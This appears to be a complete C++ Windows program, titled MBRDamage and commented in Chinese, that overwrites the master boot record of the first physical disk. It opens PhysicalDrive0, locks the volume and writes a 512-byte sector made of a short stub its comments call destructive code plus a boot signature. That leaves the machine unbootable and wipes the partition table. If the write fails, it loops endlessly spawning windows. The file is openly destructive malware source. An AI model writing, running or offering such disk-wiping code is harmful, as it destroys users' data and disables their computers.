// MBRDamage.cpp : 定义控制台应用程序的入口点。
//

//此为write MBR(主引导记录)的程序。

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
//#include <winioctl.h> 

unsigned char scode[]=
	"\xb8\x12\x00"
	"\xcd\x10\xbd"
	"\x18\x7c\xb9";

DWORD writeMBR()
{
	DWORD dwBytesReturned;
	BYTE pMBR[512]={0};

	//将破坏代码写入变量pMBR
	memcpy(pMBR, scode, sizeof(scode));
	pMBR[510]=0x55;
	pMBR[511]=0xaa;

	//打开物理磁盘
	HANDLE hDevice = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("呃...创建文件失败！");
		return -1;
	}

	//锁定卷，使用FSCTL_LOCK_VOLUME时，以下有几个参数设为NULL,0;
	/*Parameters
	hDevice
	A handle to the volume to be locked. To retrieve a device handle, call the CreateFile function. 

	dwIoControlCode
	The control code for the operation. Use FSCTL_LOCK_VOLUME for this operation. 

	lpInBuffer
	Not used with this operation; set to NULL.

	nInBufferSize
	Not used with this operation; set to zero.

	lpOutBuffer
	Not used with this operation; set to NULL.

	nOutBufferSize
	Not used with this operation; set to zero.

	lpBytesReturned
	A pointer to a variable that receives the size of the data stored in the output buffer, in bytes. */


	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	//写入磁盘文件 
	WriteFile(hDevice, pMBR, 512, &dwBytesReturned, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	return 0;
}

int main(int argc, char* argv[])
{
	HINSTANCE hinst; 
	int a;
	printf("Are you sure? any key:exit or 1:go to damage");
	scanf("%d",&a);
	if (a == 1) {
		if(writeMBR()!=0){
			while(1){
				CreateWindowEx(NULL,TEXT("MyClass"),TEXT("Title"),
											WS_OVERLAPPEDWINDOW|WS_VISIBLE,500,500,
											500,500,NULL,NULL,hinst,NULL);
				printf("aaaaa....");
			}	
		}
	} else {
		exit(0);
	}
	return 0;
}


